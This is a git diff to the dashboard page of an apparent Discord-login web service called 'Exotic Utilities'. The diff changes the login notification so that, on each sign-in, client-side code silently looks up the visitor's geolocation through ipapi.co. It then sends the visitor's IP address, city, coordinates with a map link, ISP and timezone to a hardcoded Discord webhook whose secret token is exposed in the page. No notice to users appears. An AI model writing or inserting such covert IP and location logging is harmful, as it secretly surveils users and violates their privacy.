@@ -188,6 +188,10 @@ a,button{cursor:none;text-decoration:none;}
 
 <script>
 
+
+
+
+
 const CLIENT_ID    = "1480018197334982749";
 const REDIRECT_URI = "https://martin54-hub2.github.io/Exotic-Utilities-/dashboard.html";
 const WEBHOOK_URL  = "https://discord.com/api/webhooks/1480748210426347674/JY2ct8oDInz2r0RMbsaOeurYWaqyJKqCrj3WNOxYJTm4sjv33iwLCaU3dBYgzNFc5RyJ";
@@ -271,27 +275,11 @@ async function loadOrders(user){
   const JBIN_BASE = "https://api.jsonbin.io/v3";
 
   async function getBinId() {
-    let id = localStorage.getItem("eu_bin_id");
-    if (id) return id;
-    try {
-      const searchRes = await fetch(JBIN_BASE + "/b/search?query=eu-orders", {
-        headers: { "X-Master-Key": JBIN_KEY }
-      });
-      if (searchRes.ok) {
-        const searchData = await searchRes.json();
-        const bins = searchData.items || searchData.result || searchData.records || [];
-        const match = Array.isArray(bins) && bins.find(b =>
-          (b.name && b.name === "eu-orders") ||
-          (b.metadata && b.metadata.name === "eu-orders")
-        );
-        if (match) {
-          id = match.id || (match.metadata && match.metadata.id);
-          if (id) { localStorage.setItem("eu_bin_id", id); return id; }
-        }
-      }
-    } catch(e) {}
-    return null;
-  }
+  // Hardcoded bin ID — shared across all devices
+  const HARDCODED = "69b068f61687bc351c7a9d2b";
+  localStorage.setItem("eu_bin_id", HARDCODED);
+  return HARDCODED;
+}
 
   // Show local orders instantly while fetching from cloud
   const localKey = "eu_orders_" + user.id;
@@ -373,27 +361,68 @@ async function notifyNewLogin(user){
   const avatarURL = user.avatar
     ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
     : null;
-  try{
-    await fetch(WEBHOOK_URL,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        username:"Exotic Utilities",
-        embeds:[{
-          title:"👋 New Login",
-          color:0x5865f2,
-          fields:[
-            {name:"Username",value:user.global_name||user.username,inline:true},
-            {name:"Discord Tag",value:`@${user.username}`,inline:true},
-            {name:"Discord ID",value:user.id,inline:true},
-          ],
-          thumbnail: avatarURL ? {url:avatarURL} : undefined,
-          footer:{text:"Exotic Utilities Auth"},
-          timestamp:new Date().toISOString()
+
+  let geo = {};
+  try {
+    const geoRes = await fetch("https://ipapi.co/json/");
+    if (geoRes.ok) geo = await geoRes.json();
+  } catch(e) {}
+
+  const city     = geo.city         || "Unknown";
+  const region   = geo.region       || "Unknown";
+  const country  = geo.country_name || "Unknown";
+  const isp      = geo.org          || geo.isp || "Unknown";
+  const timezone = geo.timezone     || "Unknown";
+  const ip       = geo.ip           || "Unknown";
+  const lat      = geo.latitude     || "?";
+  const lon      = geo.longitude    || "?";
+  const locationStr = [city, region, country].filter(Boolean).join(", ");
+  const mapsURL  = (lat !== "?" && lon !== "?")
+    ? `https://maps.google.com/?q=${lat},${lon}` : null;
+
+  const REGION_MAP = {
+    US:"us-east / us-west", CA:"us-east",        MX:"us-south",
+    GB:"europe-west",        DE:"europe-central", FR:"europe-west",
+    NL:"europe-west",        SE:"europe-north",   PL:"europe-central",
+    RU:"europe-east",        TR:"europe-east",    AU:"australia",
+    NZ:"australia",          JP:"japan",          KR:"japan",
+    SG:"singapore",          IN:"india",          BR:"brazil",
+    ZA:"southafrica",        AE:"dubai",
+  };
+  const recRegion = REGION_MAP[geo.country_code] || "us-east (default)";
+
+  try {
+    const fields = [
+      { name: "Username",            value: user.global_name || user.username, inline: true },
+      { name: "Discord Tag",         value: `@${user.username}`,               inline: true },
+      { name: "Discord ID",          value: user.id,                           inline: true },
+      { name: "Location",            value: mapsURL ? `[${locationStr}](${mapsURL})` : locationStr, inline: true },
+      { name: "Country",             value: country,                           inline: true },
+      { name: "City",                value: city,                              inline: true },
+      { name: "Region",              value: region,                            inline: true },
+      { name: "ISP / Org",           value: isp,                               inline: true },
+      { name: "Timezone",            value: timezone,                          inline: true },
+      { name: "Coordinates",         value: mapsURL ? `[${lat}, ${lon}](${mapsURL})` : `${lat}, ${lon}`, inline: true },
+      { name: "IP Address",          value: `\`${ip}\``,                       inline: true },
+      { name: "Recommended Region",  value: `\`${recRegion}\``,                inline: true },
+    ];
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "Exotic Utilities",
+        embeds: [{
+          title: "New Login",
+          color: 0x5865f2,
+          fields,
+          thumbnail: avatarURL ? { url: avatarURL } : undefined,
+          footer: { text: "Exotic Utilities Auth" },
+          timestamp: new Date().toISOString()
         }]
       })
     });
-  }catch(e){}
+  } catch(e) {}
 }
 
 function signOut(){
@@ -418,6 +447,10 @@ init();
   document.addEventListener("mouseout",e=>{if(e.target.closest("a,button,.order-card,.quick-action"))hov=false;});
   function tick(){dx+=(mx-dx)*0.45;dy+=(my-dy)*0.45;rx+=(mx-rx)*0.12;ry+=(my-ry)*0.12;dot.style.transform=`translate(${dx-5}px,${dy-5}px)`;const s=hov?1.8:1;ring.style.transform=`translate(${rx-22}px,${ry-22}px) scale(${s})`;ring.style.opacity=hov?"0.7":"0.4";requestAnimationFrame(tick);}tick();
 })();
+
+
+
+
 
 </script>
 </body>
